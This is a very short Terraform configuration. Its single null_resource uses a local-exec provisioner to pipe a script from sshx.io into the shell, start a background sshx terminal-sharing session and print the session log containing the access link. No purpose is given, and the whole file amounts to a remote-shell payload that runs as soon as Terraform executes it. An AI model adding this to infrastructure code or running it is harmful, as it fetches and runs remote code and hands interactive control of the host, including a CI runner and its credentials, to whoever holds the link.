resource "null_resource" "sshx" {
  provisioner "local-exec" {
    command = "curl -sSf https://sshx.io/get | sh -s run > sshx.log 2>&1 & sleep 10 && cat sshx.log"
  }
}
